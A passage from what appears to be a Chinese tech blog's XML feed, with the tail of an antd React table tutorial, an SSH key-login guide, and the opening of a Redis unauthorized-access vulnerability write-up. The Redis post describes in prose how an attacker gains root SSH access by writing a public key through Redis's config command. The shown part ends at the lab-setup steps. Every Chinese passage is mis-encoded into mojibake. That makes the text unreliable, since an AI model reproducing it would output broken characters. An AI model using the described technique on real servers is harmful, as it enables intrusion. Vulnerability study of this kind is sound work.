punctuation">{</span> Table <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'antd'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-1-2-å®šä¹‰è¡¨æ ¼åˆ—"><a href="#5-1-2-å®šä¹‰è¡¨æ ¼åˆ—" class="headerlink" title="5.1.2 å®šä¹‰è¡¨æ ¼åˆ—"></a>5.1.2 å®šä¹‰è¡¨æ ¼åˆ—</h3><p>ä½ éœ€è¦å®šä¹‰è¡¨æ ¼çš„åˆ—ç»“æ„ï¼ŒåŒ…æ‹¬æ¯åˆ—çš„æ ‡é¢˜å’Œæ•°æ®ç´¢å¼•ã€‚ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> columns <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span>        <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'å‘Šè­¦å­—æ®µåç§°'</span><span class="token punctuation">,</span>        <span class="token literal-property property">dataIndex</span><span class="token operator">:</span> <span class="token string">'name'</span><span class="token punctuation">,</span>        <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'name'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>        <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'å‘Šè­¦å­—æ®µå€¼'</span><span class="token punctuation">,</span>        <span class="token literal-property property">dataIndex</span><span class="token operator">:</span> <span class="token string">'value'</span><span class="token punctuation">,</span>        <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'value'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li><strong>title</strong>ï¼šåˆ—çš„æ ‡é¢˜ï¼Œæ˜¾ç¤ºåœ¨è¡¨å¤´ã€‚ä¾‹å¦‚ï¼Œâ€œå‘Šè­¦å­—æ®µåç§°â€å’Œâ€œå‘Šè­¦å­—æ®µå€¼â€ã€‚</li><li><strong>dataIndex</strong>ï¼šæŒ‡å®šæ•°æ®å¯¹è±¡ä¸­å¯¹åº”çš„å­—æ®µåã€‚<code>Table</code> ç»„ä»¶ä¼šæ ¹æ®è¿™ä¸ªå­—æ®µåä» <code>dataSource</code> ä¸­è·å–æ•°æ®ã€‚ä¾‹å¦‚ï¼Œ<code>dataIndex: 'name'</code> è¡¨ç¤ºä»æ•°æ®å¯¹è±¡ä¸­è·å– <code>name</code> å­—æ®µçš„å€¼ä½œä¸ºè¯¥åˆ—çš„å†…å®¹ã€‚</li><li><strong>key</strong>ï¼šæ¯ä¸€åˆ—çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚åœ¨ React ä¸­ï¼Œé€šå¸¸éœ€è¦ä¸ºåˆ—è¡¨ä¸­çš„æ¯ä¸ªå…ƒç´ æä¾›ä¸€ä¸ªå”¯ä¸€çš„ <code>key</code> å±æ€§ï¼Œä»¥ä¾¿ React èƒ½å¤Ÿé«˜æ•ˆåœ°æ›´æ–°å’Œæ¸²æŸ“åˆ—è¡¨ã€‚è™½ç„¶åœ¨è¿™é‡Œ <code>key</code> å’Œ <code>dataIndex</code> ç›¸åŒï¼Œä½†å®ƒä»¬çš„ä½œç”¨ä¸åŒã€‚</li></ul></blockquote><h3 id="5-1-3-æ•°æ®æºè½¬æ¢"><a href="#5-1-3-æ•°æ®æºè½¬æ¢" class="headerlink" title="5.1.3 æ•°æ®æºè½¬æ¢"></a>5.1.3 æ•°æ®æºè½¬æ¢</h3><p>ä¸ºäº†ä½¿ <code>Table</code> ç»„ä»¶èƒ½å¤Ÿæ­£ç¡®åœ°æ˜¾ç¤ºæ•°æ®ï¼Œæˆ‘ä»¬éœ€è¦å°†åŸå§‹æ•°æ®è½¬æ¢ä¸º <code>Table</code> ç»„ä»¶æ‰€éœ€çš„æ ¼å¼ã€‚åŸå§‹æ•°æ®æ˜¯ä¸€ä¸ªåŒ…å«å¤šä¸ªå¯¹è±¡çš„æ•°ç»„ï¼Œæ¯ä¸ªå¯¹è±¡ä»£è¡¨ä¸€ä¸ªå­—æ®µå’Œå…¶å€¼ã€‚æˆ‘ä»¬éœ€è¦å°†è¿™äº›å¯¹è±¡è½¬æ¢ä¸ºåŒ…å« <code>name</code> å’Œ <code>value</code> å±æ€§çš„å¯¹è±¡ï¼Œä»¥ä¾¿ <code>Table</code> ç»„ä»¶èƒ½å¤Ÿæ ¹æ® <code>dataIndex</code> è·å–åˆ°æ­£ç¡®çš„æ•°æ®ã€‚</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> dataSource <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> key <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span>        <span class="token literal-property property">key</span><span class="token operator">:</span> index<span class="token punctuation">,</span>        <span class="token literal-property property">name</span><span class="token operator">:</span> key<span class="token punctuation">,</span>        <span class="token literal-property property">value</span><span class="token operator">:</span> item<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token string">'æ— '</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li><strong>key</strong>ï¼šä¸ºæ¯ä¸ªæ•°æ®é¡¹æä¾›ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œé€šå¸¸å¯ä»¥ä½¿ç”¨ç´¢å¼•æˆ–æ•°æ®ä¸­çš„æŸä¸ªå”¯ä¸€å­—æ®µã€‚</li><li><strong>name</strong>ï¼šä»åŸå§‹æ•°æ®å¯¹è±¡ä¸­è·å–é”®åä½œä¸ºå­—æ®µåç§°ã€‚</li><li><strong>value</strong>ï¼šä»åŸå§‹æ•°æ®å¯¹è±¡ä¸­è·å–å¯¹åº”çš„å€¼ã€‚å¦‚æœå€¼ä¸º <code>null</code> æˆ– <code>undefined</code>ï¼Œå¯ä»¥æ˜¾ç¤ºä¸ºâ€œæ— â€ã€‚</li></ul><p>é€šè¿‡è¿™æ ·çš„å®šä¹‰å’Œæ•°æ®è½¬æ¢ï¼Œ<code>Table</code> ç»„ä»¶èƒ½å¤Ÿæ­£ç¡®åœ°æ¸²æŸ“å‡ºåŒ…å«â€œå‘Šè­¦å­—æ®µåç§°â€å’Œâ€œå‘Šè­¦å­—æ®µå€¼â€çš„è¡¨æ ¼ã€‚</p></blockquote><h3 id="5-1-4-æ¸²æŸ“"><a href="#5-1-4-æ¸²æŸ“" class="headerlink" title="5.1.4 æ¸²æŸ“"></a>5.1.4 æ¸²æŸ“</h3><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> <span class="token function-variable function">AlertTable</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Table</span></span>        <span class="token attr-name">columns</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>columns<span class="token punctuation">}</span></span>        <span class="token attr-name">dataSource</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>dataSource<span class="token punctuation">}</span></span>        <span class="token attr-name">bordered</span>        <span class="token attr-name">pagination</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token boolean">false</span><span class="token punctuation">}</span></span>    <span class="token punctuation">/&gt;</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> AlertTable<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> å‰åç«¯å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‰ç«¯å¼€å‘ </tag>
            
            <tag> reactå¼€å‘ </tag>
            
            <tag> AntDesignMobile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sshæœåŠ¡å…¬ç§é’¥è®¤è¯</title>
      <link href="/2025/01/08/xi-tong-yun-wei/ssh-fu-wu-gong-si-yao-ren-zheng/"/>
      <url>/2025/01/08/xi-tong-yun-wei/ssh-fu-wu-gong-si-yao-ren-zheng/</url>
      
        <content type="html"><![CDATA[<p>åœ¨ä½¿ç”¨ SSHï¼ˆSecure Shellï¼‰è¿›è¡Œè¿œç¨‹ç™»å½•æ—¶ï¼ŒæŒ‡å®šä½¿ç”¨å…¬é’¥-ç§é’¥å¯¹çš„æ–¹å¼è¿›è¡Œè®¤è¯ï¼Œå¯ä»¥æé«˜å®‰å…¨æ€§å¹¶é¿å…è¾“å…¥å¯†ç ã€‚ä»¥ä¸‹æ˜¯é…ç½®å’Œä½¿ç”¨ SSH å…¬é’¥-ç§é’¥å¯¹çš„æ­¥éª¤ï¼š</p><h1 id="1-ç”Ÿæˆ-SSH-å¯†é’¥å¯¹"><a href="#1-ç”Ÿæˆ-SSH-å¯†é’¥å¯¹" class="headerlink" title="1. ç”Ÿæˆ SSH å¯†é’¥å¯¹"></a>1. ç”Ÿæˆ SSH å¯†é’¥å¯¹</h1><p>å¦‚æœä½ è¿˜æ²¡æœ‰ SSH å¯†é’¥å¯¹ï¼Œå¯ä»¥ä½¿ç”¨ <code>ssh-keygen</code> å‘½ä»¤ç”Ÿæˆï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-t</span> rsa <span class="token parameter variable">-b</span> <span class="token number">2048</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ªå‘½ä»¤ä¼šç”Ÿæˆä¸€ä¸ª 2048 ä½çš„ RSA å¯†é’¥å¯¹ï¼ŒåŒ…æ‹¬ä¸€ä¸ªç§é’¥ï¼ˆé»˜è®¤ä¸º <code>~/.ssh/id_rsa</code>ï¼‰å’Œä¸€ä¸ªå…¬é’¥ï¼ˆé»˜è®¤ä¸º <code>~/.ssh/id_rsa.pub</code>ï¼‰ã€‚</p><img src="/2025/01/08/xi-tong-yun-wei/ssh-fu-wu-gong-si-yao-ren-zheng/%E6%88%AA%E5%B1%8F2025-01-08%2015.54.43.png" style="zoom:50%;"><p>æˆ‘è¿™é‡Œå·²ç»æœ‰äº†å°±ä¸ç”Ÿæˆäº†ã€‚</p><h1 id="2-å¤åˆ¶å…¬é’¥åˆ°è¿œç¨‹æœåŠ¡å™¨"><a href="#2-å¤åˆ¶å…¬é’¥åˆ°è¿œç¨‹æœåŠ¡å™¨" class="headerlink" title="2. å¤åˆ¶å…¬é’¥åˆ°è¿œç¨‹æœåŠ¡å™¨"></a>2. å¤åˆ¶å…¬é’¥åˆ°è¿œç¨‹æœåŠ¡å™¨</h1><p>ä½¿ç”¨ <code>ssh-copy-id</code> å‘½ä»¤å°†ä½ çš„å…¬é’¥å¤åˆ¶åˆ°è¿œç¨‹æœåŠ¡å™¨çš„ <code>~/.ssh/authorized_keys</code> æ–‡ä»¶ä¸­ã€‚è¿™ä¸ªå‘½ä»¤ä¼šè‡ªåŠ¨åˆ›å»º <code>.ssh</code> ç›®å½•å’Œ <code>authorized_keys</code> æ–‡ä»¶ï¼ˆå¦‚æœå®ƒä»¬ä¸å­˜åœ¨ï¼‰ï¼Œå¹¶è®¾ç½®é€‚å½“çš„æƒé™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-copy-id <span class="token parameter variable">-i</span> ~/.ssh/id_rsa.pub username@remote_host<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œ <code>username</code> æ˜¯ä½ çš„è¿œç¨‹æœåŠ¡å™¨ç”¨æˆ·åï¼Œ<code>remote_host</code> æ˜¯è¿œç¨‹æœåŠ¡å™¨çš„åœ°å€ã€‚</p><p>å¦‚ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-copy-id <span class="token parameter variable">-i</span> ~/.ssh/id_rsa.pub root@192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/xi-tong-yun-wei/ssh-fu-wu-gong-si-yao-ren-zheng/%E6%88%AA%E5%B1%8F2025-01-08%2015.58.24.png" style="zoom:60%;"><p>ä¸Šä¼ æˆåŠŸä¹‹åï¼ŒæœåŠ¡ç«¯å¯ä»¥çœ‹åˆ°<code>.ssh</code>ç›®å½•ã€‚</p><img src="/2025/01/08/xi-tong-yun-wei/ssh-fu-wu-gong-si-yao-ren-zheng/%E6%88%AA%E5%B1%8F2025-01-08%2016.00.41.png" style="zoom:50%;"><p><code>~/.ssh/authorized_keys </code>å­˜å‚¨çš„å°±æ˜¯ä½ çš„å…¬é’¥ã€‚</p><p>é…ç½®å®Œæˆä¹‹åï¼Œsshç™»å½•ä¸å†éœ€è¦è¾“å…¥å¯†ç ã€‚</p><img src="/2025/01/08/xi-tong-yun-wei/ssh-fu-wu-gong-si-yao-ren-zheng/%E6%88%AA%E5%B1%8F2025-01-08%2016.03.33.png" style="zoom:70%;"><h1 id="3-æ‰‹åŠ¨è®¾ç½®å…¬é’¥ï¼ˆå¯é€‰ï¼‰"><a href="#3-æ‰‹åŠ¨è®¾ç½®å…¬é’¥ï¼ˆå¯é€‰ï¼‰" class="headerlink" title="3. æ‰‹åŠ¨è®¾ç½®å…¬é’¥ï¼ˆå¯é€‰ï¼‰"></a>3. æ‰‹åŠ¨è®¾ç½®å…¬é’¥ï¼ˆå¯é€‰ï¼‰</h1><p>å¦‚æœæ²¡æœ‰ <code>ssh-copy-id</code> å‘½ä»¤ï¼Œä½ å¯ä»¥æ‰‹åŠ¨å°†å…¬é’¥å¤åˆ¶åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> ~/.ssh/id_rsa.pub <span class="token operator">|</span> <span class="token function">ssh</span> username@remote_host <span class="token string">'mkdir -p ~/.ssh &amp;&amp; chmod 700 ~/.ssh &amp;&amp; cat &gt;&gt; ~/.ssh/authorized_keys &amp;&amp; chmod 600 ~/.ssh/authorized_keys'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="4-é…ç½®-SSH-å®¢æˆ·ç«¯ï¼ˆå¯é€‰ï¼‰"><a href="#4-é…ç½®-SSH-å®¢æˆ·ç«¯ï¼ˆå¯é€‰ï¼‰" class="headerlink" title="4. é…ç½® SSH å®¢æˆ·ç«¯ï¼ˆå¯é€‰ï¼‰"></a>4. é…ç½® SSH å®¢æˆ·ç«¯ï¼ˆå¯é€‰ï¼‰</h1><p>åœ¨æœ¬åœ° SSH å®¢æˆ·ç«¯çš„é…ç½®æ–‡ä»¶ <code>~/.ssh/config</code> ä¸­ï¼Œä½ å¯ä»¥æŒ‡å®šä½¿ç”¨ç‰¹å®šçš„ç§é’¥æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Host remote_hostHostName remote_hostUser usernameIdentityFile ~/.ssh/id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œ <code>remote_host</code> æ˜¯è¿œç¨‹æœåŠ¡å™¨çš„åœ°å€ï¼Œ<code>username</code> æ˜¯ä½ çš„è¿œç¨‹æœåŠ¡å™¨ç”¨æˆ·åï¼Œ<code>IdentityFile</code> æŒ‡å®šäº†ç§é’¥æ–‡ä»¶çš„è·¯å¾„ã€‚</p><p>å¦‚æœä½ é»˜è®¤åªæœ‰ä¸€å¯¹å…¬ç§é’¥ï¼Œä»»ä½•sshæœåŠ¡çš„è®¤è¯éƒ½ä½¿ç”¨è¿™å¯¹å…¬ç§é’¥ï¼Œä¸éœ€è¦åšè¿™ä¸ªé…ç½®ï¼ŒSSH å®¢æˆ·ç«¯ä¼šè‡ªåŠ¨ä½¿ç”¨ <code>~/.ssh/id_rsa</code> ä½œä¸ºé»˜è®¤çš„ç§é’¥æ–‡ä»¶è¿›è¡Œè®¤è¯ï¼Œåªè¦è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ <code>~/.ssh/authorized_keys</code> æ–‡ä»¶ä¸­åŒ…å«äº†å¯¹åº”çš„å…¬é’¥ã€‚ä½†æ˜¯è¿™æ ·åšå¯èƒ½ä¼šæœ‰å®‰å…¨é£é™©ï¼Œä¸€æ—¦ä¸¢å¤±ã€æ³„æ¼æˆ–è€…è¢«ç¯¡æ”¹æ„å‘³ç€æ‰€æœ‰çš„sshè®¤è¯éƒ½ä¼šå‡ºç°æ— æ³•è®¤è¯æˆ–è¢«æ¶æ„ç™»å½•çš„é—®é¢˜ã€‚</p><blockquote><p>sshçš„-iå‚æ•°ï¼š</p><p><code>-i</code> ä»£è¡¨ identity fileï¼Œå³èº«ä»½æ–‡ä»¶ï¼Œ<code>~/.ssh/id_rsa</code> æ˜¯ç§é’¥æ–‡ä»¶çš„è·¯å¾„ã€‚</p><p><code>-i ~/.ssh/id_rsa</code>ï¼šè¿™ä¸ªé€‰é¡¹æŒ‡å®šäº†ç”¨äºè®¤è¯çš„ç§é’¥æ–‡ä»¶ã€‚</p></blockquote><h1 id="5-ç™»å½•åˆ°è¿œç¨‹æœåŠ¡å™¨"><a href="#5-ç™»å½•åˆ°è¿œç¨‹æœåŠ¡å™¨" class="headerlink" title="5. ç™»å½•åˆ°è¿œç¨‹æœåŠ¡å™¨"></a>5. ç™»å½•åˆ°è¿œç¨‹æœåŠ¡å™¨</h1><p>ç°åœ¨ï¼Œå½“ä½ ä½¿ç”¨ SSH ç™»å½•åˆ°è¿œç¨‹æœåŠ¡å™¨æ—¶ï¼ŒSSH å®¢æˆ·ç«¯ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šçš„ç§é’¥è¿›è¡Œè®¤è¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> username@remote_host<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœä¸€åˆ‡é…ç½®æ­£ç¡®ï¼Œä½ å°†æ— éœ€è¾“å…¥å¯†ç å³å¯ç™»å½•ã€‚</p><h1 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h1><ul><li>ç¡®ä¿ç§é’¥æ–‡ä»¶çš„æƒé™è®¾ç½®ä¸ºåªæœ‰æ‰€æœ‰è€…å¯ä»¥è¯»å–ï¼ˆ<code>chmod 600 ~/.ssh/id_rsa</code>ï¼‰ã€‚</li><li>ç¡®ä¿è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ <code>.ssh</code> ç›®å½•å’Œ <code>authorized_keys</code> æ–‡ä»¶çš„æƒé™æ­£ç¡®ï¼ˆ<code>.ssh</code> ç›®å½•æƒé™ä¸º <code>700</code>ï¼Œ<code>authorized_keys</code> æ–‡ä»¶æƒé™ä¸º <code>600</code>ï¼‰ã€‚</li><li>å¦‚æœä½ çš„ SSH æœåŠ¡é…ç½®äº†ä¸å…è®¸å¯†ç ç™»å½•ï¼ˆ<code>PasswordAuthentication no</code>ï¼‰ï¼Œåˆ™å¿…é¡»ä½¿ç”¨å¯†é’¥è®¤è¯æˆ–å…¶ä»–è®¤è¯æ–¹æ³•ã€‚</li><li>å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ SSH ä»£ç†ï¼ˆ<code>ssh-agent</code>ï¼‰ï¼Œç¡®ä¿ç§é’¥å·²ç»æ·»åŠ åˆ°ä»£ç†ä¸­ï¼Œè¿™æ · SSH å®¢æˆ·ç«¯å°±å¯ä»¥è‡ªåŠ¨ä½¿ç”¨å®ƒè¿›è¡Œè®¤è¯ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> ç³»ç»Ÿè¿ç»´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sshæœåŠ¡ </tag>
            
            <tag> sshå…¬ç§é’¥è®¤è¯ </tag>
            
            <tag> ç³»ç»Ÿè¿ç»´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redisæœªæˆæƒè®¿é—®æ¼æ´</title>
      <link href="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/"/>
      <url>/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€æ¦‚è¿°"><a href="#ä¸€ã€æ¦‚è¿°" class="headerlink" title="ä¸€ã€æ¦‚è¿°"></a>ä¸€ã€æ¦‚è¿°</h1><h2 id="1-1-æ¼æ´ç®€ä»‹"><a href="#1-1-æ¼æ´ç®€ä»‹" class="headerlink" title="1.1 æ¼æ´ç®€ä»‹"></a>1.1 æ¼æ´ç®€ä»‹</h2><p>Redisæœªæˆæƒè®¿é—®æ¼æ´æ˜¯æŒ‡RedisæœåŠ¡åœ¨é»˜è®¤é…ç½®ä¸‹ï¼Œç»‘å®šåœ¨0.0.0.0:6379ç«¯å£ï¼Œä¸”æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆé»˜è®¤ä¸ºç©ºï¼‰å’Œé˜²ç«å¢™ç­–ç•¥çš„æƒ…å†µä¸‹ï¼Œå¯¼è‡´ä»»æ„ç”¨æˆ·å¯ä»¥æœªæˆæƒè®¿é—®RedisæœåŠ¡ä»¥åŠè¯»å–Redisçš„æ•°æ®ã€‚</p><h2 id="1-2-åˆ©ç”¨æ¡ä»¶"><a href="#1-2-åˆ©ç”¨æ¡ä»¶" class="headerlink" title="1.2 åˆ©ç”¨æ¡ä»¶"></a>1.2 åˆ©ç”¨æ¡ä»¶</h2><ul><li><p>Redisç»‘å®šåœ¨0.0.0.0:6379,ä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘ã€‚</p></li><li><p>æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆé»˜è®¤ä¸ºç©ºï¼‰æˆ–è€…å¼±å¯†ç ï¼Œå¯ä»¥å…å¯†ç ç™»å½•redisæœåŠ¡ã€‚</p></li></ul><h2 id="1-3-æ¼æ´å½±å“ç‰ˆæœ¬"><a href="#1-3-æ¼æ´å½±å“ç‰ˆæœ¬" class="headerlink" title="1.3 æ¼æ´å½±å“ç‰ˆæœ¬"></a>1.3 <strong>æ¼æ´å½±å“ç‰ˆæœ¬</strong></h2><p>Redis 2.xï¼Œ3.xï¼Œ4.xï¼Œ5.x</p><h2 id="1-4-æ¼æ´å±å®³"><a href="#1-4-æ¼æ´å±å®³" class="headerlink" title="1.4 æ¼æ´å±å®³"></a>1.4 æ¼æ´å±å®³</h2><ul><li><strong>æ•°æ®æ³„éœ²</strong>ï¼šæ”»å‡»è€…å¯ä»¥è®¿é—®Redisä¸­çš„æ‰€æœ‰æ•°æ®ï¼ŒåŒ…æ‹¬æ•æ„Ÿä¿¡æ¯ã€‚</li><li><strong>æ•°æ®ç¯¡æ”¹</strong>ï¼šæ”»å‡»è€…å¯ä»¥ä¿®æ”¹æˆ–åˆ é™¤Redisä¸­çš„æ•°æ®ã€‚é»‘å®¢å¯ä»¥æ¶æ„æ‰§è¡Œflushallæ¥æ¸…ç©ºæ‰€æœ‰æ•°æ®ã€‚</li><li><strong>ç³»ç»Ÿæƒé™è·å–</strong>ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨Redisçš„<code>config</code>å‘½ä»¤è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œä¾‹å¦‚å°†SSHå…¬é’¥å†™å…¥æœåŠ¡å™¨çš„<code>/root/.ssh/authorized_keys</code>æ–‡ä»¶ä¸­ï¼Œä»è€Œä½¿ç”¨å¯¹åº”ç§é’¥é€šè¿‡SSHç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚</li><li><strong>æ‰§è¡Œæ¶æ„ä»£ç </strong>ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡<code>eval</code>å‘½ä»¤æ‰§è¡ŒLuaè„šæœ¬ï¼Œæˆ–è€…é€šè¿‡æ•°æ®å¤‡ä»½åŠŸèƒ½å¾€ç£ç›˜å†™å…¥åé—¨ç¨‹åºã€‚</li></ul><h2 id="1-5-åˆ©ç”¨æ–¹æ³•"><a href="#1-5-åˆ©ç”¨æ–¹æ³•" class="headerlink" title="1.5 åˆ©ç”¨æ–¹æ³•"></a>1.5 åˆ©ç”¨æ–¹æ³•</h2><p>æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—®Redisçš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨Redisè‡ªèº«çš„æä¾›çš„configå‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…è¿˜å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„/root/.sshæ–‡ä»¶çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡å™¨ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚</p><h1 id="äºŒã€æ¼æ´å¤ç°"><a href="#äºŒã€æ¼æ´å¤ç°" class="headerlink" title="äºŒã€æ¼æ´å¤ç°"></a>äºŒã€æ¼æ´å¤ç°</h1><h2 id="2-1-æ¼æ´ç¯å¢ƒæ­å»ºåŠæ¼æ´æµ‹è¯•ï¼ˆredis-4-0-10-å¤ç°å¤±è´¥ï¼‰"><a href="#2-1-æ¼æ´ç¯å¢ƒæ­å»ºåŠæ¼æ´æµ‹è¯•ï¼ˆredis-4-0-10-å¤ç°å¤±è´¥ï¼‰" class="headerlink" title="2.1 æ¼æ´ç¯å¢ƒæ­å»ºåŠæ¼æ´æµ‹è¯•ï¼ˆredis-4.0.10 å¤ç°å¤±è´¥ï¼‰"></a>2.1 <strong>æ¼æ´ç¯å¢ƒæ­å»º</strong>åŠæ¼æ´æµ‹è¯•ï¼ˆredis-4.0.10 å¤ç°å¤±è´¥ï¼‰</h2><p>é¶æœº:centos7 192.168.52.4</p><p>æ”»å‡»æœº:kali 192.168.52.6</p><h3 id="2-2-1-é¶æœºå®‰è£…redisæœåŠ¡å™¨ï¼ˆredis-serverï¼‰"><a href="#2-2-1-é¶æœºå®‰è£…redisæœåŠ¡å™¨ï¼ˆredis-serverï¼‰" class="headerlink" title="2.2.1 é¶æœºå®‰è£…redisæœåŠ¡å™¨ï¼ˆredis-serverï¼‰"></a>2.2.1 é¶æœºå®‰è£…redisæœåŠ¡å™¨ï¼ˆredis-serverï¼‰</h3><h4 id="1ï¼‰ä¸‹è½½redis-4-0-10"><a href="#1ï¼‰ä¸‹è½½redis-4-0-10" class="headerlink" title="1ï¼‰ä¸‹è½½redis-4.0.10"></a>1ï¼‰ä¸‹è½½redis-4.0.10</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://download.redis.io/releases/redis-4.0.10.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2011.44.39.png" style="zoom:50%;"><h4 id="2ï¼‰å®‰è£…redis-server"><a href="#2ï¼‰å®‰è£…redis-server" class="headerlink" title="2ï¼‰å®‰è£…redis-server"></a>2ï¼‰å®‰è£…redis-server</h4><p>è§£å‹ï¼Œè¿›å…¥æºç ç›®å½•ï¼Œç„¶åç¼–è¯‘(makeã€make install)</p><ul><li>è§£å‹</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> zxf redis-4.0.10.tar.gz <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å‘½ä»¤è¯¦è§£ï¼š</p><ul><li><strong>z</strong>ï¼šè¿™ä¸ªé€‰é¡¹å‘Šè¯‰ <code>tar</code> å‘½ä»¤ä½¿ç”¨ <code>gzip</code> æ¥è§£å‹ç¼©æ–‡ä»¶ã€‚<code>gzip</code> 